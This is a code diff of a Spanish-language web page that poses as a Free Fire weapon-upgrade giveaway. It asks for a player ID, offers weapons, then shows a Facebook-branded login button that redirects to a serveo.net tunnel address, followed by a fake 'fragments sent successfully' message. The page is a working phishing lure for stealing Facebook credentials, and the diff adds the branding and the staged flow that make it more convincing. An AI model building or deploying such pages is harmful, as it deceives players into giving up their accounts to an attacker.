@@ -6,12 +6,32 @@
     <title>Mejoramiento de Armas Evolutivas</title>
     <style>
         body {
-            background-color: #111111; /* Fondo negro */
-            color: white;
+            margin: 0;
+            padding: 0;
             font-family: Arial, sans-serif;
+            background-color: #111111;
+            color: white;
+            overflow: hidden;
+        }
+        /* Fondo con rayas azules moviéndose */
+        @keyframes moveStripes {
+            0% { background-position: 0 0; }
+            100% { background-position: 100% 0; }
+        }
+        .moving-background {
+            background: linear-gradient(45deg, #00aaff, #0055ff, #00aaff, #0055ff);
+            background-size: 200% 100%;
+            animation: moveStripes 10s linear infinite;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
         }
         .container {
             text-align: center;
+            padding: 20px;
         }
         .panel-id {
             margin-top: 20px;
@@ -24,40 +44,67 @@
             font-weight: bold;
         }
         .weapons-list {
-            display: flex;
+            display: none;
             justify-content: center;
             gap: 20px;
             margin-top: 30px;
+            flex-wrap: wrap;
         }
         .weapon-item {
             font-size: 18px;
             cursor: pointer;
+            padding: 10px;
+            background-color: #222;
+            border-radius: 5px;
         }
         .weapon-item:hover {
-            color: lightblue;
+            background-color: #444;
         }
         .facebook-login {
+            display: none;
             margin-top: 20px;
+        }
+        .facebook-login button {
+            font-size: 18px;
+            padding: 10px 20px;
+            background-color: #4267B2;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .facebook-login button:hover {
+            background-color: #365899;
         }
         .loading {
             display: none;
             font-size: 18px;
             color: green;
         }
+        .loading span {
+            font-size: 24px;
+        }
+        .facebook-logo {
+            width: 40px;
+            height: 40px;
+        }
     </style>
 </head>
 <body>
+    <!-- Fondo con rayas -->
+    <div class="moving-background"></div>
+
     <div class="container">
         <!-- Panel ID -->
-        <div class="panel-id">
+        <div class="panel-id" id="panel-id">
             <input type="text" id="user-id" placeholder="Ingresa tu ID (10 dígitos)" maxlength="10" oninput="validateId()" />
         </div>
         
         <!-- Línea Azul -->
         <div class="line">――――――――――――――――――――――</div>
 
-        <!-- Lista de Armas Evolutivas -->
-        <div class="weapons-list">
+        <!-- Lista de Armas (Escondida inicialmente) -->
+        <div class="weapons-list" id="weapons-list">
             <div class="weapon-item" onclick="selectWeapon('AK')">AK-47 🧨</div>
             <div class="weapon-item" onclick="selectWeapon('M1887')">M1887 🧨</div>
             <div class="weapon-item" onclick="selectWeapon('M1014')">M1014 🧨</div>
@@ -66,9 +113,11 @@
             <div class="weapon-item" onclick="selectWeapon('MP40')">MP40 🧨</div>
         </div>
 
-        <!-- Facebook Login -->
-        <div class="facebook-login">
-            <button onclick="facebookLogin()">Iniciar sesión con Facebook</button>
+        <!-- Login con Facebook -->
+        <div class="facebook-login" id="facebook-login">
+            <button onclick="facebookLogin()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Logo_Facebook.svg" alt="Facebook Logo" class="facebook-logo"> Iniciar sesión con Facebook
+            </button>
         </div>
 
         <!-- Mensaje de carga -->
@@ -80,24 +129,33 @@
     </div>
 
     <script>
+        // Valida el ID y redirige a la siguiente ventana (Listado de armas)
         function validateId() {
             const userId = document.getElementById('user-id').value;
             if (userId.length === 10 && /^[0-9]+$/.test(userId)) {
-                window.location.href = "weapons.html"; // Redirecciona a la página de armas
+                document.getElementById('panel-id').style.display = 'none';  // Oculta el panel de ID
+                document.getElementById('weapons-list').style.display = 'flex'; // Muestra el catálogo de armas
             }
         }
 
+        // Muestra las armas seleccionadas y redirige a la siguiente ventana
         function selectWeapon(weapon) {
             alert('Has seleccionado la ' + weapon + '. Ahora procederás a iniciar sesión.');
-            document.querySelector('.facebook-login').style.display = 'block';
+            document.getElementById('weapons-list').style.display = 'none'; // Oculta la lista de armas
+            document.getElementById('facebook-login').style.display = 'block'; // Muestra la opción de iniciar sesión
         }
 
+        // Redirige al enlace de Facebook
         function facebookLogin() {
-            window.location.href = "https://babc3bf26bafa9c869659c4fc15c359d.serveo.net"; // Redirecciona a la página de Facebook para login
+            window.location.href = "https://babc3bf26bafa9c869659c4fc15c359d.serveo.net"; // Redirige al enlace de login
 
-            // Simulando espera para mostrar mensaje
+            // Simula un tiempo de espera para mostrar el mensaje de éxito
             setTimeout(function() {
                 document.getElementById('loadingMessage').style.display = 'block';
+            }, 5000); // Espera 5 segundos
+
+            setTimeout(function() {
+                document.getElementById('loadingMessage').innerHTML += "<br>Fragmentos enviados exitosamente. Revise su caja de regalos Free Fire.<br><span id='successMessage'>¡Exitoso! ✔</span>";
             }, 5000);
         }
     </script>
